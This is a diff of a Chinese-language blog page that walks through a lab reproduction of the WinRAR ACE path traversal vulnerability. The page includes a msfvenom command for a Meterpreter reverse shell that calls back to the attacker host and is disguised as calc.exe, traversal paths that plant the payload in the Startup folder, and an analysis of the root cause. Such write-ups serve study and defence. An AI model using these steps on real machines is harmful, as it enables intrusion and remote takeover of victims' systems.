@@ -304,7 +304,7 @@
 <p>ACE 文件的解压模块 unacev2.dll 对解压缩路径进行验证时，未能正确过滤压缩文件中的“相对路径”，导致攻击者结合一些技巧可以绕过安全检查，使压缩文件中恶意构造的“相对路径”被直接用作了解压路径使用。从而可以将恶意代码静默释放到系统启动目录中，最终实现远程代码执行或 NTLM hash 泄露。</p>
 <p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">漏洞分析</a></p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Winrar &lt; 5.70 Beta 1<br>Bandzip &lt;= 6.2.0.0<br>好压（2345压缩）&lt;= 5.9.8.10907<br>360压缩 &lt;= 4.0.0.1170<br>…</p>
-<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击者/mac 192.168.8.100<br>受害者/win7 192.168.8.101<br>winrar 5.6.1版本</p>
+<h2 id="复现记录"><a href="#复现记录" class="headerlink" title="复现记录"></a>复现记录</h2><p>攻击者/mac 192.168.8.100<br>受害者/win7 192.168.8.101<br>winrar 5.61版本</p>
 <p><img src="/images/37.jpg" alt="avatar"></p>
 <h3 id="第一步：准备"><a href="#第一步：准备" class="headerlink" title="第一步：准备"></a>第一步：准备</h3><p>msf生成windows反向shell calc.exe：</p>
 <pre><code>$ msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=192.168.8.100 LPORT=4444 -f exe &gt;calc.exe
@@ -321,19 +321,19 @@
 <p>此时在启动目录C:\Users\<user name="">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup，已经有了恶意文件hi.exe:</user></p>
 <p><img src="/images/42.jpg" alt="avatar"></p>
 <p>msf准备接收反向shell(use exploit/multi/handler)：</p>
-<p><img src="/images/43.png" alt="avatar"></p>
+<p><img src="/images/43.jpg" alt="avatar"></p>
 <p>目标重启后，即可得到meterpreter会话：</p>
 <p><img src="/images/44.jpg" alt="avatar"></p>
 <h3 id="第三步：关于此漏洞利用-个人收集的5点须知"><a href="#第三步：关于此漏洞利用-个人收集的5点须知" class="headerlink" title="第三步：关于此漏洞利用-个人收集的5点须知"></a>第三步：关于此漏洞利用-个人收集的5点须知</h3><p>1.浏览器默认下载到C:\Users\miyin(或者你的用户名)\Downloads；</p>
 <p>2.如果在c盘下解压，exp.py需修改target_filename = r”C:\C:C:../Users\miyin(或者你的用户名)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe”；</p>
-<p>3、不能跨盘符；</p>
-<p>4、只能 使用一次../，而..\不受限制，所以可以跨越到任意目录,如在C:\Users\miyin(或者你的用户名)\Downloads下解压，想将exe解压到C:\windows\temp目录下，那么exp.py需修改target_filename = r”C:\C:C:../../../windows\temp\hi.exe”；</p>
-<p>5、由于 WinRAR 运行在普通用户权限下，使得攻击者无法将恶意文件静默释放至路径已知的系统启动目录（”C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”）。而释放至用户启动目录（”C:\Users\<user name="">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”）需要提前预知受害者的登陆用户名或者进行暴力猜测。<br>好在大多数此类攻击场景均是受害者将恶意构造的压缩文件下载至桌面（C:\Users\<user name="">\Desktop）或者下载目录（C:\Users\<user name="">\Downloads），而当压缩文件通过双击解压或右键解压缩时，当前的WinRAR的工作路径与压缩文件一致。这使得攻击者无需猜测受害者用户名，可通过目录穿越的方式将恶意文件释放至用户启动目录，待受害者系统启动时实现任意代码执行。在此前提下， Nadav Grossman 构造了如下的相对路径，使得远程代码执行攻击得以成功：<br>“C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe”</user></user></user></p>
+<p>3.不能跨盘符；</p>
+<p>4.只能使用一次../，而..\不受限制，所以可以跨越到任意目录,如在C:\Users\miyin(或者你的用户名)\Downloads下解压，想将exe解压到C:\windows\temp目录下，那么exp.py需修改target_filename = r”C:\C:C:../../../windows\temp\hi.exe”；</p>
+<p>5.由于 WinRAR 运行在普通用户权限下，使得攻击者无法将恶意文件静默释放至路径已知的系统启动目录（”C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”）。而释放至用户启动目录（”C:\Users\<user name="">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”）需要提前预知受害者的登陆用户名或者进行暴力猜测。<br>好在大多数此类攻击场景均是受害者将恶意构造的压缩文件下载至桌面（C:\Users\<user name="">\Desktop）或者下载目录（C:\Users\<user name="">\Downloads），而当压缩文件通过双击解压或右键解压缩时，当前的WinRAR的工作路径与压缩文件一致。这使得攻击者无需猜测受害者用户名，可通过目录穿越的方式将恶意文件释放至用户启动目录，待受害者系统启动时实现任意代码执行。在此前提下， Nadav Grossman 构造了如下的相对路径，使得远程代码执行攻击得以成功：<br>“C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe”</user></user></user></p>
 <p><img src="/images/45.jpg" alt="avatar"></p>
 <p>6、漏洞原理：<br><blockquote><p>提取文件的相对路径传递给GetDevicePathLen,它检查设备或驱动器名称前缀是否出现在Path参数中，并返回该字符串的长度如果返回值GetDevicePathLen大于0，则提取文件的相对路径将被视为完整路径，因为在调用期间目标文件夹被空字符串替换sprintf，这会导致Path Traversal漏洞。</p>
 <p>但是，有一个函数可以“cleans”提取文件的相对路径，在调用之前省略不允许的任何序列GetDevicePathLen。</p>
 <p>这是一个清除路径的伪代码”CleanPath”</p>
-<p>该函数省略了一些简单的Path Traversal序列，如“ ..\”（它只省略了”..\序列）序列，省略了驱动序列，如：” C:\”， “C:”，而且”c:\c:”也被省略掉<br>简述之：由于与该漏洞ace处理相关的DLL在对解压目标的相对路径进行解析时，CleanPath函数过滤不严导致</p>
+<p>该函数省略了一些简单的Path Traversal序列，如“ ..\”（它只省略了”..\序列）序列，省略了驱动序列，如：” C:\”， “C:”，而且”c:\c:”也被省略掉<br>简述之：由于与该漏洞ace处理相关的DLL在对解压目标的相对路径进行解析时，CleanPath函数过滤不严导致此漏洞。</p>
 </blockquote></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a><br><a href="https://github.com/Ridter/acefile">https://github.com/Ridter/acefile</a><br><a href="https://github.com/WyAtu/CVE-2018-20250">https://github.com/WyAtu/CVE-2018-20250</a><br><a href="https://xlab.tencent.com/cn/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/</a></p>
 
